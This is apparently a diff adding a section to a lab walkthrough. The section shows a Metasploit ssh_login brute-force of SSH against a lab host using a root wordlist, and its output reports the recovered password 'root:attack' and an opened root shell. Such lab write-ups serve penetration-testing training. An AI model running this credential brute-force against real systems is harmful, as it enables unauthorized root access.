@@ -201,3 +201,21 @@ MAC Address: 02:42:C0:8F:6A:03 (Unknown)
 
 Here we also got the password for the administrator. Let's connect to SSH now:
 
+What about the root password? We can use one other way which is metasploit.
+
+<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/ssh/ssh_login
+msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.143.106.3
+RHOSTS => 192.143.106.3
+msf5 auxiliary(scanner/ssh/ssh_login) > set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+userpass_file => /usr/share/wordlists/metasploit/root_userpass.txt
+msf5 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
+stop_on_success => true
+msf5 auxiliary(scanner/ssh/ssh_login) > run
+
+<strong>[+] 192.143.106.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
+</strong>[*] Command shell session 1 opened (192.143.106.2:35495 -> 192.143.106.3:22) at 2023-12-28 14:33:25 +0000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+Here we also got the password for the user `root`.
